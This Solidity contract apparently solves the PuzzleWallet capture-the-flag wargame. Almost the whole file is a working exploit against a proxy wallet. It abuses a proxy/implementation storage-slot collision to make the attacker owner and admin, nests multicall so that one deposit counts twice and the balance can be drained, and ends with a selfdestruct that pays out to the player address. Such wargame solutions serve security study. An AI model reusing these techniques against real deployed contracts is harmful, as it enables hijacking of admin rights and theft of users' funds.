// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;
pragma experimental ABIEncoderV2;

contract PuzzleWallet {

    uint256 storage_slot = 0x360894a13ba1a3210667c828492db98dca3e2076cc3735a920a3ca505d382bbc;
    address proxy = 0xd8469B65B84694Fb2F12161BE6e84b0c3Dba180E; // wallet address
    address wallet = 0x8bd69fb468Aa0F919D783222b5E02e3CDDbadaE7; // Found via etherscan looking for storage_slot
    address player = 0xD64D08C68F6940281c51108734B5b5DA95f62BD5;
    event TestBool(bool);
    event TestUint(uint256);

    // Wallet functions (pointless)
    function pwn_implem() public {

        // Set the admin address to be the player
        bytes memory payload = abi.encodeWithSignature("init(uint256)", uint256(uint160(player)));
        (bool success, ) = wallet.call(payload);
        emit TestBool(success);
    }

    function whitelist_impl() public {

        // Set the admin address to be the player
        bytes memory payload = abi.encodeWithSignature("addToWhitelist(address)", player);
        (bool success, ) = wallet.call(payload);
        emit TestBool(success);
    }

    // Proxy functions
    function propose_admin(address new_admin) public {

        // Set the admin address to be the player
        bytes memory payload = abi.encodeWithSignature("proposeNewAdmin(address)", new_admin);
        (bool success, ) = proxy.call(payload);
        emit TestBool(success);
    }

    function pwn_multicall() public payable {

        bytes[] memory callarray = new bytes[](3);
        bytes[] memory rec_callarray = new bytes[](1); // used inside the nested multicall call

        callarray[0] = abi.encodeWithSignature("deposit()");

        rec_callarray[0] = abi.encodeWithSignature("deposit()");
        callarray[1]= abi.encodeWithSignature("multicall(bytes[])", rec_callarray);

        // Single payment sent but withdrawal happens two times!
        callarray[2] = abi.encodeWithSignature("execute(address,uint256,bytes)", address(player), msg.value*2, new bytes(0x0));

        bytes memory payload = abi.encodeWithSignature("multicall(bytes[])", callarray);
        (bool success, ) = proxy.call{value:msg.value}(payload);
        emit TestBool(success);
    }

    function pwn_admin() public {

        // Use setMaxBalance to override the admin slot
        bytes memory payload = abi.encodeWithSignature("setMaxBalance(uint256)", uint256(uint160(player)));
        (bool success, ) = proxy.call(payload);
        emit TestBool(success);
    }

    function kekbye() public {

        selfdestruct(payable(player));
    }

    receive() external payable { }
}

